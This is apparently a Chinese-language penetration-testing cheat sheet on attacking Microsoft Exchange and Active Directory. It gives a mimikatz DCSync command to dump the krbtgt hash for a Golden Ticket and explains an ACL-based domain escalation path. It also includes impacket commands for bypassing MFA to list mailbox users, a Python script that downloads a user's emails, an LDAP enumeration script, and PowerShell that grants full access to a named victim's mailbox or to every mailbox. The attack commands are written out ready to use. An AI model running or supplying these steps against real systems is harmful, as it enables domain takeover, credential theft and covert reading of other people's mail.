
## 【有限制的利用】使用Exchange服务器中特定的ACL实现域提权
### 利用的Exchange Server版本条件
适用于在以下升级前的Exchange Server，以及更老的Exchange Server版本
- Exchange Server 2019 – Cumulative Update 1
- Exchange Server 2016 – Cumulative Update 12
- Exchange Server 2013 – Cumulative Update 22
就权限具体来说为以下：
1. 域的ACL中的两条Exchange Windows Permissions对其Write DACL权限的ACE的属性没有Inherit only的Flag
2. AdminSDholder对象，仍然有向“Exchange Trusted Subsystem”组授予对“组”继承对象类型的“Write DACL”权限的“允许”ACE。
### 利用流程
Exchange Trusted Subsystem, Exchange Windows Permission, Organization Management这三个组内用户有WriteDACL权限，如果获得组内用户身份凭据，那么就能够为指定域用户添加ACE，使其获得利用DCSync导出域内所有用户hash的权限，接下来可以使用域用户krbtgt的hash制作Golden Ticket，登录域控制器，获得对整个域的控制权限。
以mimikatz为例，指令如下
```powershell
# 使用mimikatz的DCSync功能导出用户krbtgt的hash
mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /user:krbtgt /csv" exit
```
### 参考链接
- https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E4%BD%BF%E7%94%A8Exchange%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%89%B9%E5%AE%9A%E7%9A%84ACL%E5%AE%9E%E7%8E%B0%E5%9F%9F%E6%8F%90%E6%9D%83
- https://support.microsoft.com/en-gb/topic/reducing-permissions-required-to-run-exchange-server-when-you-use-the-shared-permissions-model-e1972d47-d714-fd76-1fd5-7cdcb85408ed
## 信息搜集
### 一、【普通用户】Exchange绕过MFA查看所有地址列表
条件：已经获得Exchange普通用户的登录凭证
```bash
# 列出所有地址列表
impacket-exchanger username:'password'@exchangeserver nspi list-tables
# 查看所有邮箱用户
impacket-exchanger username:'password'@exchangeserver nspi dump-tables -name "All Users"
```
### 二、【普通用户】Exchange绕过MFA查看自身用户邮件
* 条件：已经获得Exchange普通用户的登录凭证<br>

```python
# Modified from 
# https://stackoverflow.com/questions/58765068/how-to-save-email-messge-item-generated-using-exchangelib-library-in-python
# POST data to /EWS/Exchange.asmx
# exchangelib: Python client for Microsoft Exchange Web Services (EWS)
from exchangelib import Account, Configuration, Credentials, DELEGATE

def connect(server, email, username, password):
    """
    Get Exchange account cconnection with server
    """
    creds = Credentials(username=username, password=password)
    config = Configuration(server=server, credentials=creds)
    return Account(primary_smtp_address=email, autodiscover=False, config = config, access_type=DELEGATE)

def get_recent_emails(account, count):
    """
    Retrieve most emails for a given folder
    """
    # Get the folder object
    folder = account.inbox
    # Get emails
    return folder.all().order_by('-datetime_received')[:count]
email = ''
username = ''
password = ''
server = ''
account = connect(server, email, username, password)

emails = get_recent_emails(account, 10)
msgs = []
s = "email_"
i=0
for msg in emails:
    with open(s+str(i)+".html","w") as a:
        a.write(str(msg.body))
    i+=1
```

### 三、【普通用户】通过域控查找所有Exchange服务器
```bash
#!/bin/bash
# 查找所有Exchange服务器
username=''
password=''
domainController=''

myarray=(`echo $domainController | tr '.' ' '`)
j=0
len=${#myarray[@]}
len2=$((len-2))
domain=""
for i in `seq 1 $len2`
do
domain+='DC='
domain+=${myarray[$i]}
domain+=','
done
domain+='DC='
domain+=${myarray[-1]}
DN="CN=Exchange Servers,OU=Microsoft Exchange Security Groups,"$domain
DNlist=$(ldapsearch -x -H "ldap://$domainController" -D "$username" -w "$password" -b "$DN" member |grep ^member: |awk -F ": " '{print $2}'|grep -v "CN=Exchange Install Domain Servers")

for i in $DNlist
do
ldapsearch -x -H "ldap://$domainController" -D "$username" -w "$password" -b "$i" dNSHostName |grep ^dNSHostName:|awk -F ": " '{print $2}'
done
```

### 四、【管理员】Exchange查看其他用户邮件
条件：已经获得Exchange管理员的登录凭证
#### 通过网页端授权
1. 访问 https://exchange_domain/ecp, 进入管理中心
2. 选择recipients标签，之后再选择mailboxes标签
3. 选择需要查看的用户收件箱，之后选择编辑Edit，会弹出一个新页面
4. 在新页面选择最下面的mailbox delegation，然后划到最下面，添加管理员以给予Full Access权限
5. 访问 https://exchange_domain/owa， 进入邮件网页端
6. 在左侧栏选择到自己的名词的标签（Inbox的上一级标签），右击，选择Add Shared Folder，输入想要查看的用户的名称，点击确定。
7. 之后左侧栏便会显示其他用户的邮箱
#### 通过Exchange Management Shell授权
- 授权单个收件箱: 
```powershell
Add-MailboxPermission -Identity victim@test.local -User user_in_control@test.local -AccessRights fullaccess -InheritanceType all
```
- 授权所有收件箱：
```powershell
Get-Mailbox -ResultSize unlimited -Filter {(RecipientTypeDetails -eq 'UserMailbox') -and (Alias -ne 'Admin')} | Add-MailboxPermission -User user_in_control@test.local -AccessRights fullaccess -InheritanceType all
```
授权完成后，重复“通过网页端授权”的5-7步即可